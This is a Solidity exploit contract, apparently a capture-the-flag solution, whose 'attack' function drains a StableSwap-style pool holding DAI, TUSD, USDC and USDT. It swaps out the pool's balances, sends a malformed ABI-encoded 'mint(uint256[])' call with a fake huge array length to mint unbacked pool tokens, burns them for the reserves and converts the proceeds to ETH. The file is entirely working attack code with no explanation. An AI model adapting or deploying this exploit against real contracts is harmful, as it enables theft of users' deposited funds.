pragma solidity 0.4.24;

import "../swap/ERC20.sol";
import "../swap//Swap.sol";

contract Router {
    function swapExactETHForTokens(uint amountOutMin, address[] memory path, address to, uint deadline)
        public
        payable
        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] memory path, address to, uint deadline)
        public
        payable
        returns (uint[] memory amounts);
}

contract Swapper {
    Router router = Router(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a);

    function swapBack(ERC20Like token, uint256 amountLeft) private {
        token.approve(address(router), 2**256 - 1);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        router.swapExactTokensForETH(
            token.balanceOf(address(this)) - amountLeft,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function attack(address target) public payable {
        ERC20Like[4] memory tokens = [
            ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F),
            ERC20Like(0x0000000000085d4780B73119b644AE5ecd22b376),
            ERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            ERC20Like(0xdAC17F958D2ee523a2206206994597C13D831ec7)
        ];

        tokens[0].approve(target, 2**256 - 1);
        address[] memory path = new address[](2);
        path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        path[1] = address(tokens[0]);
        router.swapExactETHForTokens
            .value(msg.value)(0, path, address(this), block.timestamp);

        for(uint8 i=0; i<3; i++) {
            uint256 targetBal = tokens[i+1].balanceOf(target);
            uint256 toSwap = targetBal* 1000 / 997;
            uint256 toSwapNorm = toSwap;

            if(tokens[i+1].decimals() == 6) {
                toSwapNorm = toSwap * 10 ** 12;
            }
            StableSwap(target).swap(tokens[0], toSwapNorm, tokens[i+1]);
            tokens[i+1].approve(target, 2**256 - 1);
        }

        swapBack(tokens[0], 1000e18);
        swapBack(tokens[1], 1);
        swapBack(tokens[2], 1000e6);
        swapBack(tokens[3], 0);


        bytes memory payload = abi.encodeWithSignature("mint(uint256[])", 0x20, 3618502788666131106986593281521497120414687020801267626233049500247285301248);
        target.call(payload);

        uint256 toBurn = StableSwap(target).balanceOf(address(this));
        StableSwap(target).burn(toBurn);
        
        swapBack(tokens[0], 0);
        swapBack(tokens[2], 0);
    }

    function() external payable {}
}

